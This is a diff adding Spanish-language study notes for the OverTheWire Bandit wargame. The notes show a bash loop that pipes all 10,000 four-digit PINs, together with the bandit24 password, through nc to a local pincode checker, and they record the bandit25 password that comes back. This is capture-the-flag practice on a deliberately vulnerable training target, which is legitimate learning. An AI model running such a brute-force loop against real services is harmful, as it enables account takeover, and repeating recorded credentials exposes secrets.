@@ -4,4 +4,14 @@ I am the pincode checker for user bandit25. Please enter the password for user b
 
 # Aca entra la parte divertida de crear un script para hacer brute-forcing
 # Tengo que probar las 10.000 combinaciones de un pin de 4 digitos
+                                                               
+#!/bin/bash
+for i in $(seq -w 0 9999); do
+    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
+done | nc localhost 30002
+
+# Despues de mucho, me da la password. Igual se puede buscar distintas maneras de hacerlo. Esta creo que feu la mas sencilla
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+
 
